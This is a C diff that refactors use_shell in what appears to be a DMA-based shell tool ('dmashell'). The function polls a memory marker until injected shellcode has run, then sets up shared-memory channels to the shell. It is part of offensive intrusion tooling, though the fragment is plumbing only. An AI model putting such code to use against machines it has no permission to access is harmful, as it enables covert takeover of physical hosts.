@@ -298,6 +298,9 @@ void use_shell(linear_handle lin, uint32_t base)
 	uint8_t true_value = 0x1;
 
 	uint8_t child_is_dead = 0;
+	uint32_t mark_value;
+	uint32_t mark_location;
+	int	secs = 0;
 
 	uint8_t rfrm_writer_pos = 0;
 	uint8_t rfrm_reader_pos = 0;
@@ -309,6 +312,9 @@ void use_shell(linear_handle lin, uint32_t base)
 	char    rto_buffer[2]; // shell -> master
 	int	rto_active;
 
+	// calc addr of mark
+	mark_location = base - MARKER_LEN + MARK_OFFSET;
+
 #define SET_rfrm_writer_pos linear_write_in_page(lin, base + RFRM_WRITER_POS, &rfrm_writer_pos, 1)
 #define GET_rfrm_reader_pos linear_read_in_page(lin, base + RFRM_READER_POS, &rfrm_reader_pos, 1)
 #define GET_rto_writer_pos linear_read_in_page(lin, base + RTO_WRITER_POS, &rto_writer_pos, 1)
@@ -316,27 +322,19 @@ void use_shell(linear_handle lin, uint32_t base)
 #define GET_child_is_dead linear_read_in_page(lin, base + CHILD_IS_DEAD, &child_is_dead, 1)
 #define ACK_child_is_dead linear_write_in_page(lin, base + CHILD_IS_DEAD, &child_is_dead, 1)
 #define DO_terminate_child linear_write_in_page(lin, base + TERMINATE_CHILD, &true_value, 1)
+#define GET_mark linear_read_in_page(lin, base - MARKER_LEN + MARK_OFFSET, &mark_value, 4);
 
 	set_nonblocking_stdin();
 	// set STDIN to non-blocking.
 
-	{ 
-		uint32_t mark_value;
-		uint32_t mark_location;
-		int secs = 0;
-
-		// calc offset of mark
-		mark_location = base - MARKER_LEN + MARK_OFFSET;
-		// get mark
-		linear_read(lin, mark_location, &mark_value, 4);
-		if(mark_value != MARK_CHANGED) {
-			printf(TERM_YELLOW "(dmashell)" TERM_RESET " waiting for shellcode to be executed...\n");
-			while(mark_value != MARK_CHANGED) {
-				printf("still sleeping (%d seconds, mark: 0x%08x)\r", secs, mark_value);
-				sleep(1);
-				// get mark
-				linear_read(lin, mark_location, &mark_value, 4);
-			}
+	// wait for MARK
+	GET_mark;
+	if(mark_value != MARK_CHANGED) {
+		printf(TERM_YELLOW "(dmashell)" TERM_RESET " waiting for shellcode to be executed...\n");
+		while(mark_value != MARK_CHANGED) {
+			printf("still sleeping (%d seconds, mark: 0x%08x)\r", secs, mark_value);
+			sleep(1);
+			GET_mark;
 		}
 	}
 
